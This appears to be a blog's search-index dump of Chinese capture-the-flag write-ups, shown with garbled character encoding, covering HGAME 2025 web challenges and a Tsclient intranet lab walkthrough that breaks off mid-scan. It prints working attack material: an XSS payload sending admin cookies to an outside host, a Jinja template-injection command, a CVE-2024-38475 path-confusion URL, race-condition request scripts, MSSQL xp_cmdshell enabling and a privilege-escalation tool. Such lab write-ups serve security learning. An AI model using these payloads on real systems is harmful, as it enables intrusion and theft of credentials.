69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 